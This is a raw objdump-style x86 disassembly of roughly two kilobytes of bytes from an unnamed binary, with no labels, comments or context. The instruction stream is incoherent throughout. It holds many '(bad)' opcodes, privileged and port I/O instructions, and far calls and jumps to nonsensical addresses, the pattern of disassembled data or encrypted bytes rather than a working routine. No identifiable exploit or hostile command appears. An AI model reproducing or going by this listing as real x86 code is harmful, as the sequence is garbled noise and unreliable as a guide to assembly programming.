  407a69:	mov    WORD PTR [ecx-0x3385d8ca],ds
  407a6f:	repz inc ecx
  407a71:	sbb    ebx,esi
  407a73:	jns    0x407a8f
  407a75:	std    
  407a76:	dec    eax
  407a77:	mov    DWORD PTR [ebx-0x1c4e1769],esp
  407a7d:	clc    
  407a7e:	popf   
  407a7f:	nop
  407a80:	lock and dh,BYTE PTR [ecx-0x4424336a]
  407a87:	lds    esp,FWORD PTR [esi-0x3edbad7b]
  407a8d:	dec    esi
  407a8e:	fisttp QWORD PTR [ecx+0x70436ea]
  407a94:	cdq    
  407a95:	scas   eax,DWORD PTR es:[edi]
  407a96:	dec    eax
  407a97:	mov    al,ds:0xfe3f5d77
  407a9c:	(bad)  
  407a9d:	jmp    0x407a8b
  407a9f:	fmul   st,st(4)
  407aa1:	mov    cl,0x4c
  407aa3:	call   0x4fb28db4
  407aa8:	inc    ebx
  407aa9:	and    bh,BYTE PTR ds:0x2f3ab6ab
  407aaf:	and    eax,DWORD PTR [eax+0x63]
  407ab2:	mov    bh,0x24
  407ab4:	retf   
  407ab5:	sbb    ebx,0xffffffcf
  407ab8:	mov    ds:0xd779a46,al
  407abd:	add    BYTE PTR [edi],dh
  407abf:	in     al,0x6
  407ac1:	push   ecx
  407ac2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407ac3:	or     BYTE PTR [eax-0x74c1881c],cl
  407ac9:	mov    ebp,edx
  407acb:	or     DWORD PTR [edx],0xffffffd0
  407ace:	pop    esi
  407acf:	(bad)  
  407ad0:	sub    ebp,DWORD PTR [edx+0x32]
  407ad3:	add    edx,ecx
  407ad5:	mov    esp,0x155e790
  407ada:	cwde   
  407adb:	mov    ebp,0xa8805cd5
  407ae0:	jmp    0x407b00
  407ae2:	xchg   ebp,ebp
  407ae4:	jne    0x407aaf
  407ae6:	adc    DWORD PTR [edi-0x598c3c1e],0x6e
  407aed:	ja     0x407b69
  407aef:	ins    DWORD PTR es:[edi],dx
  407af0:	ret    0xf08e
  407af3:	fldenv [edi]
  407af5:	std    
  407af6:	sbb    cl,dh
  407af8:	mov    DWORD PTR [ecx-0x69],0xc513782e
  407aff:	or     BYTE PTR [ebx+edx*1],al
  407b02:	imul   edx,DWORD PTR [bx+di],0xffffffe6
  407b06:	inc    ebp
  407b07:	dec    ebp
  407b08:	pop    esp
  407b09:	mov    al,0xbc
  407b0b:	fwait
  407b0c:	mov    WORD PTR [edx-0x2168f766],es
  407b12:	fwait
  407b13:	mov    ds:0xb95331dc,eax
  407b18:	or     bl,BYTE PTR [ebx]
  407b1a:	mov    WORD PTR [ebp+0x3398eec7],?
  407b20:	xor    BYTE PTR [edi+esi*8],ah
  407b23:	cmp    ebp,esp
  407b25:	xchg   ebp,eax
  407b26:	or     al,dh
  407b28:	inc    ebx
  407b29:	inc    edx
  407b2a:	das    
  407b2b:	push   ebx
  407b2c:	cld    
  407b2d:	je     0x407b70
  407b2f:	mov    BYTE PTR [ecx-0x58e2af1e],ah
  407b35:	and    BYTE PTR [eax],0xaf
  407b38:	arpl   WORD PTR [ebp+0x73],bp
  407b3b:	jge    0x407b2f
  407b3d:	jbe    0x407b58
  407b3f:	or     DWORD PTR [ebp-0x18],0xffffffaf
  407b43:	jmp    0x98f:0x6dcc52eb
  407b4a:	pop    es
  407b4b:	std    
  407b4c:	dec    esp
  407b4d:	sbb    eax,0x761460b4
  407b52:	daa    
  407b53:	xor    al,0xf2
  407b55:	or     DWORD PTR [ecx+0x3],0x48
  407b59:	repz cmp dh,BYTE PTR [ecx+edi*8-0x5c423ff1]
  407b61:	(bad)  
  407b62:	clc    
  407b63:	push   0x9a78ad42
  407b68:	and    dh,cl
  407b6a:	add    BYTE PTR [esi],0xd
  407b6d:	add    DWORD PTR [ecx],ebp
  407b6f:	xchg   edx,eax
  407b70:	adc    ebp,DWORD PTR es:[eax]
  407b73:	xchg   edi,eax
  407b74:	les    eax,FWORD PTR [ecx-0x422a76af]
  407b7a:	ror    BYTE PTR [ecx],1
  407b7c:	sub    dh,BYTE PTR [ecx+0x4d9949a9]
  407b82:	xor    eax,DWORD PTR cs:[edx-0x641340b7]
  407b89:	cmp    BYTE PTR [ebx-0xd],dh
  407b8c:	pusha  
  407b8d:	fcom   QWORD PTR [ecx+0x1]
  407b90:	inc    ebp
  407b91:	shr    bh,cl
  407b93:	push   esp
  407b94:	adc    ch,BYTE PTR [eax+ebx*4]
  407b97:	inc    esi
  407b98:	bound  edi,QWORD PTR [ecx+0x28]
  407b9b:	out    0x2a,al
  407b9d:	div    BYTE PTR [edi-0x39fa6af]
  407ba3:	mov    ds:0x5a5630c7,eax
  407ba8:	mov    bh,0x87
  407baa:	and    DWORD PTR [edi+ebx*8],ecx
  407bad:	fsubr  st(2),st
  407baf:	test   eax,0xda1d1c9e
  407bb4:	mov    BYTE PTR [ebp-0x6b],ah
  407bb7:	push   ebx
  407bb8:	lahf   
  407bb9:	cmp    eax,0xf2964a36
  407bbe:	mov    dl,al
  407bc0:	mov    eax,0x408fedcf
  407bc5:	test   al,al
  407bc7:	sti    
  407bc8:	js     0x407b82
  407bca:	adc    al,0x8
  407bcc:	or     ecx,DWORD PTR [ebx-0x62aa2fec]
  407bd2:	pop    esi
  407bd3:	mov    ecx,0x4e6a2cc3
  407bd8:	inc    esp
  407bd9:	loopne 0x407b86
  407bdb:	dec    ecx
  407bdc:	adc    edi,eax
  407bde:	add    BYTE PTR [edi-0x79acbe15],dh
  407be4:	add    BYTE PTR [edi+edi*2+0x3d358e17],cl
  407beb:	jge    0x407b8d
  407bed:	fimul  DWORD PTR fs:[ebp+0x45aaf782]
  407bf4:	pusha  
  407bf5:	pop    eax
  407bf6:	gs pop ecx
  407bf8:	clc    
  407bf9:	jge    0x407bf8
  407bfb:	jae    0x407c6a
  407bfd:	in     al,dx
  407bfe:	sbb    eax,0x56e10bf7
  407c03:	jae    0x407bca
  407c05:	sbb    DWORD PTR [ecx+0x3e66d4b2],0x1a303a5e
  407c0f:	or     al,0x89
  407c11:	push   DWORD PTR gs:[bx+di]
  407c15:	mov    ebp,0x4bc439ce
  407c1a:	dec    edx
  407c1b:	rcl    DWORD PTR [edi+eax*8],0xfb
  407c1f:	sbb    edx,DWORD PTR [ecx+0x530f6d4]
  407c25:	fisubr DWORD PTR [ebp-0x7b]
  407c28:	adc    BYTE PTR [eax],bh
  407c2a:	sti    
  407c2b:	call   0x96a4:0xb1409f74
  407c32:	leave  
  407c33:	mov    BYTE PTR [eax-0x4408580],0x4c
  407c3a:	xchg   ebx,eax
  407c3b:	mov    WORD PTR [edi+edx*4+0x77],?
  407c3f:	cmc    
  407c40:	inc    esi
  407c41:	iret   
  407c42:	cmc    
  407c43:	mov    al,BYTE PTR [ecx-0x16]
  407c46:	push   ds
  407c47:	aas    
  407c48:	ret    0xe318
  407c4b:	ficomp WORD PTR [edi+0x6c850c41]
  407c51:	dec    ebx
  407c52:	inc    edx
  407c53:	or     cl,bl
  407c55:	out    dx,al
  407c56:	cmp    al,0x6f
  407c58:	and    al,0x68
  407c5a:	int    0xa7
  407c5c:	adc    bl,bh
  407c5e:	inc    eax
  407c5f:	shl    sp,1
  407c62:	ins    BYTE PTR es:[edi],dx
  407c63:	retf   0xc039
  407c66:	jns    0x407cbd
  407c68:	mov    edi,ecx
  407c6a:	mov    edi,0x67c3815a
  407c6f:	ds mov cl,0xb4
  407c72:	sbb    BYTE PTR [edi],dh
  407c74:	pusha  
  407c75:	mov    BYTE PTR [ebx],ch
  407c77:	adc    eax,0xf240239
  407c7c:	icebp  
  407c7d:	mov    esi,0x88b99038
  407c82:	mov    ax,0x8fe1
  407c86:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407c87:	outs   dx,BYTE PTR ds:[esi]
  407c88:	int    0xb2
  407c8a:	retf   
  407c8b:	test   eax,0xbdd989c1
  407c90:	cld    
  407c91:	je     0x407c9e
  407c93:	stos   DWORD PTR es:[edi],eax
  407c94:	jp     0x407cfe
  407c96:	sbb    dh,BYTE PTR [ecx+edx*4]
  407c99:	call   0x621f:0xfdfcb153
  407ca0:	jb     0x407c55
  407ca2:	(bad)  
  407ca3:	shl    BYTE PTR [eax+0x0],0xa
  407ca7:	jne    0x407ce2
  407ca9:	sbb    BYTE PTR [ebp-0x6877c903],ah
  407caf:	mov    WORD PTR ds:0xf3c7e025,gs
  407cb5:	cld    
  407cb6:	in     eax,dx
  407cb7:	push   edi
  407cb8:	icebp  
  407cb9:	in     eax,dx
  407cba:	scas   eax,DWORD PTR es:[edi]
  407cbb:	daa    
  407cbc:	cs rol bh,cl
  407cbf:	int    0x5e
  407cc1:	mov    edx,0x4e6dfe75
  407cc6:	lea    ebp,[edi]
  407cc8:	imul   esp,edx,0xffffff87
  407ccb:	(bad)  
  407ccc:	test   eax,0xab3bb642
  407cd1:	and    ebx,DWORD PTR [ebp+0x72]
  407cd4:	sub    eax,0x9d0f5c64
  407cd9:	mov    cl,0xf7
  407cdb:	xchg   ebx,eax
  407cdc:	outs   dx,BYTE PTR ds:[esi]
  407cdd:	call   0xc01d6906
  407ce2:	fsub   DWORD PTR [eax-0x4b861f41]
  407ce8:	mov    ecx,0xd945b4a7
  407ced:	ror    BYTE PTR [edi-0x5e],1
  407cf0:	mov    al,ds:0x86400d2c
  407cf5:	xchg   edx,eax
  407cf6:	outs   dx,DWORD PTR ds:[esi]
  407cf7:	popf   
  407cf8:	jp     0x407c81
  407cfa:	mov    ecx,0xf23fd6f2
  407cff:	xchg   ecx,eax
  407d00:	gs cld 
  407d02:	fistp  DWORD PTR [edi-0x4b]
  407d05:	jg     0x407d1d
  407d07:	push   edx
  407d08:	out    0x2e,eax
  407d0a:	cdq    
  407d0b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407d0c:	clc    
  407d0d:	cmp    BYTE PTR [esi+ebx*1-0x627e4176],0x12
  407d15:	mov    al,0x5b
  407d17:	push   esi
  407d18:	mov    BYTE PTR [eax-0x8a6738a],bl
  407d1e:	pop    ds
  407d1f:	lds    ebp,FWORD PTR [esi-0x5c]
  407d22:	lods   eax,DWORD PTR ds:[esi]
  407d23:	push   esi
  407d24:	push   es
  407d25:	stc    
  407d26:	sub    bh,cl
  407d28:	pop    es
  407d29:	retf   0xcec9
  407d2c:	rol    DWORD PTR [ecx],1
  407d2e:	sbb    edi,DWORD PTR [eax+ebx*4+0x1f1d40f3]
  407d35:	sbb    DWORD PTR [edi-0x45],ebx
  407d38:	(bad)  
  407d39:	enter  0x916,0x7d
  407d3d:	mov    ebp,edi
  407d3f:	scas   eax,DWORD PTR es:[edi]
  407d40:	dec    ebp
  407d41:	xchg   edi,eax
  407d42:	mov    ebp,0xfb98868
  407d47:	dec    ecx
  407d48:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407d49:	inc    esi
  407d4a:	mov    al,0x5
  407d4c:	retf   
  407d4d:	inc    eax
  407d4e:	test   ecx,0xc1ee56f4
  407d54:	lds    ecx,FWORD PTR [eax-0x49e31370]
  407d5a:	sbb    ecx,DWORD PTR [esi-0x3c6e601]
  407d60:	test   DWORD PTR [edx],edx
  407d62:	cmp    DWORD PTR [esi+0x4fe3da7],edx
  407d68:	(bad)  
  407d69:	xchg   esp,eax
  407d6a:	fidiv  WORD PTR [edi-0x6faecda]
  407d70:	jno    0x407d37
  407d72:	fistp  QWORD PTR [ebx+0x3b]
  407d75:	xchg   ecx,eax
  407d76:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407d77:	push   ebp
  407d78:	push   esi
  407d79:	daa    
  407d7a:	lds    edi,FWORD PTR [edx-0x5d]
  407d7d:	out    0x5b,eax
  407d7f:	jb     0x407d5f
  407d81:	pop    eax
  407d82:	call   0xdebe:0xc1e1130b
  407d89:	or     DWORD PTR [edx-0x1f],esi
  407d8c:	pop    esp
  407d8d:	jle    0x407df4
  407d8f:	inc    esp
  407d90:	test   al,0x11
  407d92:	in     eax,0xfc
  407d94:	cs dec eax
  407d96:	(bad)  
  407d97:	cs out dx,eax
  407d99:	sub    ebp,edi
  407d9b:	addr16 int3 
  407d9d:	cli    
  407d9e:	lock popf 
  407da0:	sbb    al,0xe
  407da2:	add    BYTE PTR [edx+0x211799c0],bl
  407da8:	sbb    dh,BYTE PTR [esp+esi*2+0x5b]
  407dac:	out    0xdd,al
  407dae:	outs   dx,DWORD PTR ds:[esi]
  407daf:	imul   edx,edx,0xf89ea9e8
  407db5:	mov    DWORD PTR [eax],edx
  407db7:	mov    eax,DWORD PTR [ebp-0xc]
  407dba:	cmp    eax,0x58133098
  407dbf:	jmp    0x408135
  407dc4:	cwde   
  407dc5:	mov    eax,ds:0x5b4dbc42
  407dca:	mov    ds:0x4fdb206d,al
  407dcf:	or     cl,ch
  407dd1:	in     eax,0x98
  407dd3:	lock adc cl,0x7c
  407dd7:	jl     0x407db0
  407dd9:	jns    0x407e57
  407ddb:	jl     0x407dc7
  407ddd:	(bad)  [edx+esi*2+0x4d]
  407de1:	push   ebp
  407de2:	mov    esi,0xea68aa0c
  407de7:	pop    esi
  407de8:	xchg   esi,eax
  407de9:	sbb    dh,BYTE PTR [esi+0x2b0bc449]
  407def:	cmp    al,0x4b
  407df1:	test   BYTE PTR [edx-0x7c],dh
  407df4:	pushf  
  407df5:	mov    al,ds:0xd06543dd
  407dfa:	jg     0x407e6a
  407dfc:	pop    edx
  407dfd:	mov    ebp,0x2c2f4448
  407e02:	jl     0x407da5
  407e04:	out    dx,al
  407e05:	in     al,0x37
  407e07:	dec    eax
  407e08:	and    ecx,edi
  407e0a:	jp     0x407e47
  407e0c:	retf   
  407e0d:	lea    ecx,[esp+edx*2-0x22]
  407e11:	mov    cl,BYTE PTR [ebx-0x57c3670d]
  407e17:	fs loope 0x407d9f
  407e1a:	sbb    ebx,DWORD PTR [esi+0x43]
  407e1d:	out    0x26,al
  407e1f:	rol    DWORD PTR [ebx-0x7fadff6c],0x64
  407e26:	sti    
  407e27:	ds retf 0xd75d
  407e2b:	cli    
  407e2c:	sar    BYTE PTR ds:0xa946a52,0x7e
  407e33:	or     eax,0xa90a885
  407e38:	fldcw  WORD PTR [edi]
  407e3a:	xchg   esi,ebx
  407e3c:	fcomip st,st(2)
  407e3e:	xchg   DWORD PTR [eax+ecx*1-0x47],edx
  407e42:	dec    esi
  407e43:	into   
  407e44:	pop    ebp
  407e45:	adc    BYTE PTR [edi],bl
  407e47:	mov    edi,0x54ead2df
  407e4c:	jmp    0x55fe96b5
  407e51:	dec    edi
  407e52:	stc    
  407e53:	cmp    ebp,DWORD PTR [edx-0x10]
  407e56:	lods   al,BYTE PTR ds:[esi]
  407e57:	or     ch,BYTE PTR [ecx]
  407e59:	jns    0x407e1f
  407e5b:	nop
  407e5c:	enter  0xf91e,0xe9
  407e60:	push   ebp
  407e61:	daa    
  407e62:	(bad)  [esi+0x74]
  407e65:	(bad)  
  407e66:	mov    edx,0x997d53be
  407e6b:	(bad)  
  407e6f:	loopne 0x407e0b
  407e71:	mov    ds:0xebb9746e,eax
  407e76:	xor    BYTE PTR [ebp+0x4b],dh
  407e79:	(bad)  
  407e7a:	outs   dx,BYTE PTR ds:[esi]
  407e7b:	in     eax,dx
  407e7c:	push   edx
  407e7d:	aas    
  407e7e:	or     BYTE PTR [ecx],ch
  407e80:	in     al,dx
  407e81:	push   cs
  407e82:	retf   
  407e83:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407e84:	jnp    0x407e2b
  407e86:	daa    
  407e87:	adc    BYTE PTR [esi-0x4cfd6f9],al
  407e8d:	adc    BYTE PTR [edx],0x8e
  407e90:	sahf   
  407e91:	nop
  407e92:	les    ebp,FWORD PTR [ebx]
  407e94:	mov    al,0xae
  407e96:	adc    esi,DWORD PTR [eax]
  407e98:	mov    eax,0x889f5f04
  407e9d:	aas    
  407e9e:	dec    ebp
  407e9f:	dec    ebx
  407ea0:	in     al,0xcc
  407ea2:	addr16 je 0x407efe
  407ea5:	sbb    BYTE PTR [edi+0x35d7e038],cl
  407eab:	jle    0x407e6d
  407ead:	xchg   esi,eax
  407eae:	push   esp
  407eaf:	jnp    0x407e5e
  407eb1:	popf   
  407eb2:	shl    ebp,0x70
  407eb5:	lds    edi,FWORD PTR [edi]
  407eb7:	jmp    0x4d68c70b
  407ebc:	loopne 0x407e5d
  407ebe:	jmp    0xd0f4:0xb73bbd5e
  407ec5:	std    
  407ec6:	leave  
  407ec7:	pop    eax
  407ec8:	out    0x9f,al
  407eca:	dec    ebp
  407ecb:	in     eax,dx
  407ecc:	inc    eax
  407ecd:	sub    bh,al
  407ecf:	jg     0x407f4f
  407ed1:	adc    eax,DWORD PTR [edi]
  407ed3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407ed4:	je     0x407f2a
  407ed6:	aad    0x17
  407ed8:	div    DWORD PTR [edx-0x7e]
  407edb:	out    dx,al
  407edc:	inc    edx
  407edd:	cld    
  407ede:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407edf:	and    DWORD PTR [edx+eax*2-0x50b3d5cc],edi
  407ee6:	add    al,ah
  407ee8:	aas    
  407ee9:	fwait
  407eea:	sub    DWORD PTR [edx+0x72],esi
  407eed:	mov    esi,0x737f1f48
  407ef2:	xor    DWORD PTR [edi+0x38d5d86d],0x8d96f336
  407efc:	and    al,BYTE PTR [ecx-0x36]
  407eff:	or     BYTE PTR [esi],dl
  407f01:	or     DWORD PTR [edi+edi*2+0x40589067],ecx
  407f08:	mov    edx,0x4e37b7b5
  407f0d:	iret   
  407f0e:	or     al,0xba
  407f10:	cwde   
  407f11:	ds call 0x8396:0x5345f541
  407f19:	outs   dx,BYTE PTR ds:[esi]
  407f1a:	ja     0x407eb3
  407f1c:	test   DWORD PTR [edx],edi
  407f1e:	aam    0x4e
  407f20:	mov    esp,DWORD PTR [ecx+0x3d]
  407f23:	jb     0x407f04
  407f25:	mov    ebp,0x4775bc75
  407f2a:	dec    ebx
  407f2b:	inc    esp
  407f2c:	push   ebp
  407f2d:	out    0x57,eax
  407f2f:	in     eax,dx
  407f30:	dec    esi
  407f31:	mov    ds:0x739de37c,eax
  407f36:	inc    esp
  407f37:	div    DWORD PTR [eax]
  407f39:	add    dh,cl
  407f3b:	and    esp,DWORD PTR [edi-0x49f8fb27]
  407f41:	cli    
  407f42:	icebp  
  407f43:	pop    ecx
  407f44:	in     eax,dx
  407f45:	pop    ds
  407f46:	inc    ebx
  407f47:	aam    0xf8
  407f49:	mov    ds:0x3581b92b,eax
  407f4e:	(bad)  
  407f4f:	xchg   ebx,eax
  407f50:	cmp    edx,DWORD PTR [ebx]
  407f52:	xor    DWORD PTR [ebp+0x3f],edi
  407f55:	fistp  QWORD PTR gs:[ebx-0x4f3bc75e]
  407f5c:	(bad)  
  407f5d:	xchg   edi,eax
  407f5e:	adc    DWORD PTR [esi],edx
  407f60:	bnd jbe 0x407f8c
  407f63:	test   eax,0x8d17aa5c
  407f68:	data16 jbe 0x407fad
  407f6b:	push   0x8ce532e
  407f70:	inc    BYTE PTR [ebx]
  407f72:	or     esi,DWORD PTR ss:[ebx+0x27375a22]
  407f79:	nop
  407f7a:	pushf  
  407f7b:	add    dh,BYTE PTR [edx+0x45fc14d0]
  407f81:	jae    0x407fbb
  407f83:	inc    esi
  407f84:	and    al,0xd5
  407f86:	push   eax
  407f87:	sbb    BYTE PTR [eax],ch
  407f89:	repz cmp BYTE PTR [ebx+0x32a3b9fe],bl
  407f90:	and    BYTE PTR [ebx+ebx*8],dh
  407f93:	f2xm1  
  407f95:	dec    ebx
  407f96:	sbb    ebp,DWORD PTR [eax-0x50fd28ba]
  407f9c:	js     0x407fa1
  407f9e:	xchg   edx,eax
  407f9f:	fiadd  WORD PTR [edi+0x10]
  407fa2:	push   0x713c6abe
  407fa7:	imul   eax,DWORD PTR [edi+0x27798a6],0x7f
  407fae:	inc    eax
  407faf:	push   cs
  407fb0:	cmp    cl,al
  407fb2:	mov    ch,0x16
  407fb4:	mov    cl,BYTE PTR [ecx]
  407fb6:	shl    DWORD PTR [ecx-0x9],cl
  407fb9:	rcr    DWORD PTR [edi-0xb],cl
  407fbc:	and    DWORD PTR [edx+0x7b72500a],esi
  407fc2:	mov    al,0xa6
  407fc4:	adc    esi,DWORD PTR [esi]
  407fc6:	xchg   ebp,eax
  407fc7:	ret    
  407fc8:	(bad)  
  407fc9:	lods   eax,DWORD PTR ds:[esi]
  407fca:	test   DWORD PTR [ebx+0x66],eax
  407fcd:	jg     0x407f7f
  407fcf:	adc    eax,0x300b557a
  407fd4:	mov    ch,BYTE PTR [ebp-0x53]
  407fd7:	ja     0x407fa7
  407fd9:	and    bh,BYTE PTR [ebp+0x59]
  407fdc:	lods   eax,DWORD PTR ds:[esi]
  407fdd:	pop    ebp
  407fde:	iret   
  407fdf:	or     al,BYTE PTR [ecx-0x15]
  407fe2:	test   eax,0x6f293293
  407fe7:	lea    eax,[ebp-0x3f]
  407fea:	and    al,cl
  407fec:	jae    0x407fe8
  407fee:	(bad)  
  407fef:	iret   
  407ff0:	ins    BYTE PTR es:[edi],dx
  407ff1:	pop    eax
  407ff2:	xor    ch,BYTE PTR [ecx]
  407ff4:	dec    edx
  407ff5:	stos   DWORD PTR es:[edi],eax
  407ff6:	les    esi,FWORD PTR [edx+0x40]
  407ff9:	jecxz  0x408052
  407ffb:	and    al,0x67
  407ffd:	dec    esp
  407ffe:	es push esi
  408000:	int    0xc8
  408002:	test   al,0xa8
  408004:	inc    ebx
  408005:	sbb    BYTE PTR [ebx+ebx*1-0x3e329824],dh
  40800c:	pushf  
  40800d:	adc    BYTE PTR [esi],cl
  40800f:	ficomp WORD PTR [ebp-0x19]
  408012:	xchg   esi,eax
  408013:	add    DWORD PTR [esi+0x5d],edx
  408016:	add    eax,0xf8db6391
  40801b:	jnp    0x408043
  40801d:	mov    ecx,0xeb81d9cb
  408022:	jg     0x408088
  408024:	(bad)  
  408025:	out    dx,eax
  408026:	jnp    0x40800d
  408028:	add    eax,edi
  40802a:	call   0x41df7973
  40802f:	xchg   edi,eax
  408030:	xchg   esp,eax
  408031:	jns    0x407fdb
  408033:	sbb    ebp,ecx
  408035:	push   esi
  408036:	adc    al,0xd7
  408038:	xchg   DWORD PTR [ebx-0x7e],ebx
  40803b:	or     al,BYTE PTR [edi+0x25]
  40803e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40803f:	push   edi
  408040:	mov    ebx,0xc3755072
  408045:	mov    ah,0x4c
  408047:	sahf   
  408048:	out    dx,al
  408049:	ds stc 
  40804b:	mov    cl,0x53
  40804d:	enter  0xa991,0xfa
  408051:	add    eax,0x45f30551
  408056:	dec    esp
  408057:	mov    BYTE PTR ds:0x89f641dc,ch
  40805d:	sahf   
  40805e:	imul   ebp,DWORD PTR [edx+0x64],0xffffffe6
  408062:	es cli 
  408064:	mov    ebx,0x89b97ffe
  408069:	cmp    eax,0x4a
  40806c:	out    dx,eax
  40806d:	pop    ebx
  40806e:	mov    al,ds:0x8b2f05d
  408073:	mov    bh,0x68
  408075:	sbb    al,BYTE PTR [eax]
  408077:	pop    eax
  408078:	cmp    cl,BYTE PTR [eax]
  40807a:	adc    cl,ah
  40807c:	or     eax,0xd37dc991
  408081:	mov    edx,0x27fac02c
  408086:	scas   eax,DWORD PTR es:[edi]
  408087:	xchg   ebp,eax
  408088:	or     dl,BYTE PTR [edi+0x145ffe39]
  40808e:	xchg   esi,eax
  40808f:	lods   eax,DWORD PTR ds:[esi]
  408090:	sbb    eax,0x6f5fba8a
  408095:	mov    esi,0xfc717ff6
  40809a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40809b:	or     al,0x80
  40809d:	pop    ebx
  40809e:	ins    DWORD PTR es:[edi],dx
  40809f:	fistp  DWORD PTR [ebx-0x7ff9a4b6]
  4080a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4080a6:	cdq    
  4080a7:	mov    WORD PTR [esi+0x1b12b61a],?
  4080ad:	jbe    0x40809c
  4080af:	push   edx
  4080b0:	mov    dl,0xa4
  4080b2:	push   es
  4080b3:	sub    eax,0x94494727
  4080b8:	and    eax,0xddfe4b8c
  4080bd:	inc    eax
  4080be:	push   edi
  4080bf:	mov    ds:0x25ab5a13,eax
  4080c4:	mov    eax,cr7
  4080c7:	shr    DWORD PTR [edx],cl
  4080c9:	out    0x5f,al
  4080cb:	xor    DWORD PTR [ebx],ebp
  4080cd:	ss jo  0x408131
  4080d0:	add    esp,ebp
  4080d2:	pop    edx
  4080d3:	inc    edi
  4080d4:	mov    ch,0xcd
  4080d6:	push   esp
  4080d7:	jne    0x408138
  4080d9:	add    ch,0x7b
  4080dc:	fdivr  QWORD PTR ds:0xfc7063
  4080e2:	test   al,0x9d
  4080e4:	jmp    0x4080e3
  4080e6:	and    eax,DWORD PTR cs:[esi+0x4a]
  4080ea:	jns    0x40812e
  4080ec:	retf   
  4080ed:	inc    ebx
  4080ee:	rol    DWORD PTR [ecx-0x3c],1
  4080f1:	fs jp  0x408078
  4080f4:	mov    eax,ds:0x529bf74a
  4080f9:	push   esi
  4080fa:	popa   
  4080fb:	test   al,0xd
  4080fd:	jae    0x4080e6
  4080ff:	test   al,0xb6
  408101:	loop   0x40808a
  408103:	std    
  408104:	call   0xa86d:0xbee6f283
  40810b:	ret    
  40810c:	loopne 0x4080cd
  40810e:	dec    ebx
  40810f:	mov    DWORD PTR [esi-0x6e2f4778],eax
  408115:	enter  0x19c5,0xa8
  408119:	sbb    ch,BYTE PTR [edi+0x403280fc]
  40811f:	jnp    0x4080de
  408121:	sub    esp,DWORD PTR [edx-0x7464077a]
  408127:	int3   
  408128:	fsubr  QWORD PTR [edx]
  40812a:	stos   DWORD PTR es:[edi],eax
  40812b:	mov    ds:0x9847940d,al
  408130:	int    0xfc
  408132:	cdq    
  408133:	adc    eax,DWORD PTR [esi]
  408135:	je     0x4084c8
  40813b:	mov    eax,DWORD PTR [ebp-0x1c]
  40813e:	or     DWORD PTR [eax],0x60751c98
  408144:	jmp    0x4084ba
  408149:	pop    edx
  40814a:	jns    0x4080ea
  40814c:	fs bound ecx,QWORD PTR gs:[di]
  408151:	add    ebp,ebp
  408153:	push   ebx
  408154:	sbb    ecx,DWORD PTR [ebx+0x5b0fb8a5]
  40815a:	sar    BYTE PTR [esp+edi*2-0x29],cl
  40815e:	jns    0x4081dc
  408160:	jl     0x408106
  408162:	test   eax,0xb38d4fde
  408167:	inc    ebx
  408168:	outs   dx,BYTE PTR ds:[esi]
  408169:	xor    DWORD PTR [ebx],esp
  40816b:	adc    eax,0x4deba66e
  408170:	pop    es
  408171:	add    esi,DWORD PTR [esi-0x77]
  408174:	std    
  408175:	mov    ecx,esp
  408177:	jns    0x4081e8
  408179:	mov    ecx,DWORD PTR [ebx-0xf2a02ee]
  40817f:	or     eax,0xf09de7a
  408184:	pop    eax
  408185:	add    eax,0x1100b318
  40818a:	(bad)  
  40818b:	jns    0x4081e0
  40818d:	mov    DWORD PTR [esi],ebp
  40818f:	push   esp
  408190:	test   eax,0x3686f063
  408195:	imul   ecx,DWORD PTR [edi-0x2111db21],0xa6f73668
  40819f:	sub    al,0xc2
  4081a1:	fdiv   st(0),st
  4081a3:	xor    BYTE PTR [edi+ecx*8+0x43],0x38
  4081a8:	push   ebp
  4081a9:	icebp  
  4081aa:	test   eax,0xfaf6b58a
  4081af:	push   ds
  4081b0:	leave  
  4081b1:	jbe    0x408163
  4081b3:	cdq    
  4081b4:	js     0x408136
  4081b6:	ret    
  4081b7:	push   esp
  4081b8:	sub    BYTE PTR [edx+0x86c71e3],0xd9
  4081bf:	mov    edi,0x1dea784
  4081c4:	popf   
  4081c5:	push   ebx
  4081c6:	add    BYTE PTR [ecx-0x5d],al
  4081c9:	cli    
  4081ca:	mov    es,WORD PTR [ebx]
  4081cc:	mov    eax,ds:0xf920eca8
  4081d1:	lods   eax,DWORD PTR ds:[esi]
  4081d2:	mov    dl,0xa3
  4081d4:	jae    0x408187
  4081d6:	pop    ecx
  4081d7:	shl    BYTE PTR [ecx+0x60f00277],cl
  4081dd:	pop    es
  4081de:	dec    edi
  4081df:	mov    al,0x3a
  4081e1:	cs aad 0x8a
  4081e4:	or     DWORD PTR [ebx+ebp*8+0x5b],0x5c18661e
  4081ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4081ed:	out    dx,al
  4081ee:	cwde   
  4081ef:	test   ebp,edi
  4081f1:	aad    0x84
  4081f3:	arpl   ax,bx
  4081f5:	adc    DWORD PTR [eax-0x42],esp
  4081f8:	mov    BYTE PTR [ebx],ah
  4081fa:	pusha  
  4081fb:	ja     0x4081de
  4081fd:	in     al,dx
  4081fe:	aaa    
  4081ff:	fidiv  WORD PTR [eax]
  408201:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408202:	jecxz  0x4081b9
  408204:	stc    
  408205:	dec    BYTE PTR [edx]
  408207:	cmp    bh,bl
  408209:	or     dh,BYTE PTR [ecx-0x2bb51193]
  40820f:	mov    WORD PTR [edi],ss
  408211:	bound  ecx,QWORD PTR [esi+0x40]
  408214:	std    
  408215:	add    bl,BYTE PTR fs:[ecx-0x77d7cf70]
  40821c:	cmp    BYTE PTR [edx+0x56],ch
  40821f:	test   bl,0xba
  408222:	xchg   edi,eax
  408223:	stos   BYTE PTR es:[edi],al
  408224:	or     DWORD PTR [eax],esp
  408226:	fdivr  QWORD PTR [esi+0x4174e813]
  40822c:	ins    BYTE PTR es:[edi],dx
  40822d:	inc    esp
  40822e:	scas   eax,DWORD PTR es:[edi]
  40822f:	dec    ebx
  408230:	frstor [esi+0x33feca97]
  408236:	lods   eax,DWORD PTR ds:[esi]
